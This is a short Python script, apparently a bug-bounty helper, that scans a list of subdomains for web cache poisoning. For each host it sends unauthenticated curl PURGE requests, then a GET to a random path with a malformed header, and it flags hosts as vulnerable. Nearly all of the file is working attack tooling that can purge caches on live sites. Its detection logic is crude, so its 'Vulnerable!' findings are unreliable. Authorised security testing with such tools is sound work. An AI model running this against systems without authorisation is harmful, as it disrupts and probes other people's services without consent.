import subprocess
import sys

# Check if the file path is provided as a command-line argument
if len(sys.argv) < 2:
    print("Usage: python3 scope.py <path_to_subdomain.txt> [thread_rate]")
    sys.exit(1)

# Get the path to subdomain.txt from command-line arguments
file_path = sys.argv[1]

# Get the thread rate if provided, else set default to 1
thread_rate = int(sys.argv[2]) if len(sys.argv) > 2 else 1

# Validate the thread rate
if not (1 <= thread_rate <= 100):
    print("Thread rate must be between 1 and 100.")
    sys.exit(1)

# Load subdomains from the specified file
try:
    with open(file_path, "r") as file:
        subdomains = file.read().splitlines()
except FileNotFoundError:
    print(f"File not found: {file_path}")
    sys.exit(1)

# Function to test cache poisoning on a subdomain
def test_cache_poisoning(subdomain):
    target_url = f"https://{subdomain}"

    # Step 1: Send PURGE request
    print(f"\n[SCOPE] Testing {subdomain} - Sending PURGE request...")
    purge_response = subprocess.run(
        ["curl", "-s", "-I", "-X", "PURGE", target_url],
        capture_output=True,
        text=True
    )
    
    # Check if X-Cache-Hits: 1 is in the response
    if "X-Cache-Hits: 1" in purge_response.stdout:
        print("[SCOPE] X-Cache-Hits: 1 found - Potentially vulnerable. Proceeding with GET request...")

        # Step 3: Send GET request with an illegal header
        random_path_url = f"{target_url}/random-path"
        get_response = subprocess.run(
            [
                "curl", "-s", "-I", "-X", "GET", random_path_url,
                "-H", f"Host: {subdomain}", "-H", "Some-Illegal-Header: \\."
            ],
            capture_output=True,
            text=True
        )

        # Step 4: Verify if the random path is accessible (checking for a 200 OK status)
        if "200 OK" in get_response.stdout:
            print(f"[SCOPE] Vulnerable! Cached page accessible at: {random_path_url}")
        else:
            print(f"[SCOPE] No cache poisoning detected for {subdomain}.")
    else:
        print(f"[SCOPE] {subdomain} does not appear vulnerable (no X-Cache-Hits: 1).")

# Loop through each subdomain and test for cache poisoning vulnerability
for subdomain in subdomains:
    test_cache_poisoning(subdomain)
